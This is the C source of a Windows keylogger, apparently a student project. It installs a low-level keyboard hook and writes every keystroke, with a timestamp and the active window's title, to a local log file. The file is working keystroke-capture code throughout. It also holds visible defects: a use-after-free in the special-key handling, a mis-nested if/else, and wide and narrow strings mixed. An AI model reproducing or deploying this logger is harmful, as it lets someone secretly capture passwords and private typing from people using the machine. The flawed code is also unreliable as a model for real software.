/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   winkey.c                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: emaugale <emaugale@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2023/03/25 18:35:47 by emaugale          #+#    #+#             */
/*   Updated: 2023/03/29 01:57:39 by emaugale         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include <windows.h>
#include <stdio.h>
#include <stdint.h>
#include <stdbool.h>

HHOOK kbd_hook = NULL;
bool capsLock, shift;
FILE *f;
char title[256];
char timestamp[256];
HWND hwnd;
SYSTEMTIME st;
char keyboard_state[256];
wchar_t buf[2];
char *key_pressed;
char  output[256];

BOOL shift_pressed[2] = {FALSE, FALSE};


void    getKeysState(bool *capsLock, bool *shift) {
    /*
        // Getting the state of the keys in order to know if they are pressed or not.    
    */
    *capsLock = GetKeyState(VK_CAPITAL) & 0x0001;
}

void    handleSpecial(int vkCode, char *key_pressed) {
    /*
        // Attributing a value to all the "special" keys in order to make them readable for the user.

        // vkCode: The virtual key code of the key pressed.

        // -----------------------------
        // In this function, we also check if shift is pressed or not in order to be able to write the key pressed in the right case. 
    */
    if (key_pressed)
        free(key_pressed);
    switch (vkCode) {
        case VK_SPACE:                  key_pressed = strdup("[SPACE]"); break;
        case VK_RETURN:                 key_pressed = strdup("[ENTER]"); break;
        case VK_BACK:                   key_pressed = strdup("[BACKSPACE]"); break;
        case VK_TAB:                    key_pressed = strdup("[TAB]"); break;
        case VK_ESCAPE:                 key_pressed = strdup("[ESC]"); break;
        case VK_CAPITAL:                key_pressed = strdup("[CAPSLOCK]"); break;
        case VK_SHIFT:                  key_pressed = strdup("[SHIFT]"); break;
        case VK_LCONTROL:               key_pressed = strdup("[LEFT CTRL]"); break;
        case VK_RCONTROL:               key_pressed = strdup("[RIGHT CTRL]"); break;
        case VK_LSHIFT:                 shift_pressed[0] = true; key_pressed = strdup("[LEFT SHIFT]"); break;
        case VK_RSHIFT:                 shift_pressed[1] = true; key_pressed = strdup("[RIGHT SHIFT]"); break;
        case VK_LMENU:                  key_pressed = strdup("[LEFT ALT]"); break;
        case VK_RMENU:                  key_pressed = strdup("[RIGHT ALT]"); break;
        case VK_LWIN:                   key_pressed = strdup("[LEFT WIN]"); break;
        case VK_RWIN:                   key_pressed = strdup("[RIGHT WIN]"); break;
        case VK_APPS:                   key_pressed = strdup("[APPS]"); break;
        case VK_SNAPSHOT:               key_pressed = strdup("[PRINT SCREEN]"); break;
        case VK_INSERT:                 key_pressed = strdup("[INSERT]"); break;
        case VK_DELETE:                 key_pressed = strdup("[DELETE]"); break;
        case VK_HOME:                   key_pressed = strdup("[HOME]"); break;
        case VK_END:                    key_pressed = strdup("[END]"); break;
        case VK_PRIOR:                  key_pressed = strdup("[PAGE UP]"); break;
        case VK_NEXT:                   key_pressed = strdup("[PAGE DOWN]"); break;
        case VK_UP:                     key_pressed = strdup("[UP]"); break;
        case VK_DOWN:                   key_pressed = strdup("[DOWN]"); break;
        case VK_LEFT:                   key_pressed = strdup("[LEFT]"); break;
        case VK_RIGHT:                  key_pressed = strdup("[RIGHT]"); break;
        case VK_NUMLOCK:                key_pressed = strdup("[NUMLOCK]"); break;
        case VK_DIVIDE:                 key_pressed = strdup("[NUM /]"); break;
        case VK_MULTIPLY:               key_pressed = strdup("[NUM *]"); break;
        case VK_SUBTRACT:               key_pressed = strdup("[NUM -]"); break;
        case VK_ADD:                    key_pressed = strdup("[NUM +]"); break;
        case VK_DECIMAL:                key_pressed = strdup("[NUM .]"); break;
        case VK_NUMPAD0:                key_pressed = strdup("[NUM 0]"); break;
        case VK_NUMPAD1:                key_pressed = strdup("[NUM 1]"); break;
        case VK_NUMPAD2:                key_pressed = strdup("[NUM 2]"); break;
        case VK_NUMPAD3:                key_pressed = strdup("[NUM 3]"); break;
        case VK_NUMPAD4:                key_pressed = strdup("[NUM 4]"); break;
        case VK_NUMPAD5:                key_pressed = strdup("[NUM 5]"); break;
        case VK_NUMPAD6:                key_pressed = strdup("[NUM 6]"); break;
        case VK_NUMPAD7:                key_pressed = strdup("[NUM 7]"); break;
        case VK_NUMPAD8:                key_pressed = strdup("[NUM 8]"); break;
        case VK_NUMPAD9:                key_pressed = strdup("[NUM 9]"); break;
        case VK_F1:                     key_pressed = strdup("[F1]"); break;
        case VK_F2:                     key_pressed = strdup("[F2]"); break;
        case VK_F3:                     key_pressed = strdup("[F3]"); break;
        case VK_F4:                     key_pressed = strdup("[F4]"); break;
        case VK_F5:                     key_pressed = strdup("[F5]"); break;
        case VK_F6:                     key_pressed = strdup("[F6]"); break;
        case VK_F7:                     key_pressed = strdup("[F7]"); break;
        case VK_F8:                     key_pressed = strdup("[F8]"); break;
        case VK_F9:                     key_pressed = strdup("[F9]"); break;
        case VK_F10:                    key_pressed = strdup("[F10]"); break;
        case VK_F11:                    key_pressed = strdup("[F11]"); break;
        case VK_F12:                    key_pressed = strdup("[F12]"); break;
    }
}

int    specialCombinaison(int vkCode, char *key_pressed) {
    /*
        // Attributing a value to all the "special" keys in order to make them readable for the user.

        // vkCode: The virtual key code of the key pressed.
        // key_pressed: The string that will be returned to the user.

        // Return: 1 if the key is a special key, 0 otherwise.

        // Note: This function is currently working for AZERTY and QWERTY layouts, we don't handle more layouts because it's not really pertinent
        //       to map all existing layouts. If we found a smarter way to do it, we will implement it to handle more layouts.
    */


    if (shift_pressed[0] || shift_pressed[1]) {
        HKL layout = GetKeyboardLayout(0);
        switch (LOWORD(layout)) {
            case 0x040C: // FR
                switch (vkCode) {
                    case 0x30:                      return (key_pressed = strcpy(key_pressed, "0"), 1);
                    case 0x31:                      return (key_pressed = strcpy(key_pressed, "1"), 1);
                    case 0x32:                      return (key_pressed = strcpy(key_pressed, "2"), 1);
                    case 0x33:                      return (key_pressed = strcpy(key_pressed, "3"), 1);
                    case 0x34:                      return (key_pressed = strcpy(key_pressed, "4"), 1);
                    case 0x35:                      return (key_pressed = strcpy(key_pressed, "5"), 1);
                    case 0x36:                      return (key_pressed = strcpy(key_pressed, "6"), 1);
                    case 0x37:                      return (key_pressed = strcpy(key_pressed, "7"), 1);
                    case 0x38:                      return (key_pressed = strcpy(key_pressed, "8"), 1);
                    case 0x39:                      return (key_pressed = strcpy(key_pressed, "9"), 1);
                    case VK_OEM_PLUS:               return (key_pressed = strcpy(key_pressed, "+"), 1);
                    case VK_OEM_MINUS:              return (key_pressed = strcpy(key_pressed, "°"), 1);
                    case VK_OEM_COMMA:              return (key_pressed = strcpy(key_pressed, "?"), 1);
                    case VK_OEM_PERIOD:             return (key_pressed = strcpy(key_pressed, "."), 1);
                    case VK_OEM_1:                  return (key_pressed = strcpy(key_pressed, "£"), 1);
                    case VK_OEM_2:                  return (key_pressed = strcpy(key_pressed, "/"), 1);
                    case VK_OEM_3:                  return (key_pressed = strcpy(key_pressed, "%"), 1);
                    case VK_OEM_4:                  return (key_pressed = strcpy(key_pressed, "°"), 1);
                    case VK_OEM_5:                  return (key_pressed = strcpy(key_pressed, "µ"), 1);
                    case VK_OEM_6:                  return (key_pressed = strcpy(key_pressed, "}"), 1);

                }
            default: // we assume that the default layout is US QWERTY
                switch (vkCode) {
                    case VK_OEM_PLUS:               return (key_pressed = strcpy(key_pressed, "+"), 1);
                    case VK_OEM_MINUS:              return (key_pressed = strcpy(key_pressed, "_"), 1);
                    case 0x39:                      return (key_pressed = strcpy(key_pressed, "("), 1);
                    case 0x38:                      return (key_pressed = strcpy(key_pressed, "*"), 1);
                    case 0x37:                      return (key_pressed = strcpy(key_pressed, "&"), 1);
                    case 0x36:                      return (key_pressed = strcpy(key_pressed, "^"), 1);
                    case 0x35:                      return (key_pressed = strcpy(key_pressed, "%"), 1);
                    case 0x34:                      return (key_pressed = strcpy(key_pressed, "$"), 1);
                    case 0x33:                      return (key_pressed = strcpy(key_pressed, "#"), 1);
                    case 0x32:                      return (key_pressed = strcpy(key_pressed, "@"), 1);
                    case 0x31:                      return (key_pressed = strcpy(key_pressed, "!"), 1);
                    case 0x30:                      return (key_pressed = strcpy(key_pressed, ")"), 1);
                    case VK_OEM_COMMA:              return (key_pressed = strcpy(key_pressed, "<"), 1);
                    case VK_OEM_PERIOD:             return (key_pressed = strcpy(key_pressed, ">"), 1);
                    case VK_OEM_1:                  return (key_pressed = strcpy(key_pressed, ":"), 1);
                    case VK_OEM_2:                  return (key_pressed = strcpy(key_pressed, "?"), 1);
                    case VK_OEM_4:                  return (key_pressed = strcpy(key_pressed, "{"), 1);
                    case VK_OEM_5:                  return (key_pressed = strcpy(key_pressed, "|"), 1);
                    case VK_OEM_6:                  return (key_pressed = strcpy(key_pressed, "}"), 1);
                    case VK_OEM_7:                  return (key_pressed = strcpy(key_pressed, "\""), 1);
                }
            }
        return 0;
    }
}


LRESULT hookproc(int code, WPARAM wparam, LPARAM lparam) {
    /*
        // The hook procedure that will be called every time a key is pressed.

        // The hook procedure is called with the following parameters:
        // code: Specifies whether the hook procedure must process the message.
        // wparam: Specifies whether the key is being pressed or released.
        // lparam: Pointer to a KBDLLHOOKSTRUCT structure.

        // The hook procedure will write on a logfile the current timestamp, the window title and the key pressed.
    */
    if (code < 0)
        return CallNextHookEx(kbd_hook, code, wparam, lparam);

    KBDLLHOOKSTRUCT const *info = (KBDLLHOOKSTRUCT const *)lparam;

    if (info->flags & LLKHF_UP && info->vkCode != VK_CAPITAL) {
        if (info->vkCode == VK_LSHIFT) {
            shift_pressed[0] = false;
        }
        else if (info->vkCode == VK_RSHIFT) {
            shift_pressed[1] = false;
        }
        return 0;
    }


    if (!(key_pressed = malloc(sizeof(char) * 4)))
        return 0;
    if (info->vkCode == VK_CAPITAL || info->vkCode == VK_SHIFT)
        getKeysState(&capsLock, &shift);
    GetKeyboardState(keyboard_state);

    int buf_len = ToUnicodeEx(info->vkCode, info->scanCode, keyboard_state, buf, 2, 0, NULL);
    if (buf_len >= 0)
    {
        buf[buf_len] = 0;
        int ret = WideCharToMultiByte(CP_UTF8, 0, buf, -1, key_pressed, 4, NULL, NULL);


        if (info->vkCode == VK_SPACE || info->vkCode == VK_RETURN || info->vkCode == VK_BACK 
            || info->vkCode == VK_TAB || info->vkCode == VK_ESCAPE || ret == 1)
            handleSpecial(info->vkCode, key_pressed);


        if ((capsLock && (!shift_pressed[0] || !shift_pressed[1])) || (!capsLock && (shift_pressed[0] || shift_pressed[1])))
            if (!specialCombinaison(info->vkCode, key_pressed))
                key_pressed[0] = toupper(key_pressed[0]);
        else if ((!capsLock && (!shift_pressed[0] || !shift_pressed[1])) || (capsLock && (shift_pressed[0] || shift_pressed[1])))
            if (!specialCombinaison(info->vkCode, key_pressed))
                key_pressed[0] = tolower(key_pressed[0]);
        
        GetLocalTime(&st);

        sprintf(timestamp, "%02d:%02d:%02d.%03d", st.wHour, st.wMinute, st.wSecond, st.wMilliseconds);
        hwnd = GetForegroundWindow();
        GetWindowTextA(hwnd, title, 256);

        WideCharToMultiByte(CP_UTF8, 0, title, -1, title, 256, NULL, NULL);
        sprintf(output, "[%s] <%s> => %s\n", timestamp, title, key_pressed);
        printf("%s", output);
        fwrite(output, 1, strlen(output), f);
        fflush(f);
        free(key_pressed);
    }

    return 0;
}

int main(void) {
    char path[1024];
    GetModuleFileNameA(NULL, path, 1024);
    char *last_slash = strrchr(path, '\\');
    if (last_slash)
        *last_slash = '\0';

    HINSTANCE hInstance = GetModuleHandleW(NULL);
    f = fopen(strcat(path, "\\log.txt"), "w");
    if (!f)
        return (printf("failed to open log file\n"), 1);
    
    getKeysState(&capsLock, &shift);
    kbd_hook = SetWindowsHookExW(WH_KEYBOARD_LL, hookproc, hInstance, 0);
    if (!kbd_hook)
        return (printf("hook installation failed: %d\n", GetLastError(), 1));

    MSG msg;
    GetMessageW(&msg, NULL, 0, 0);
}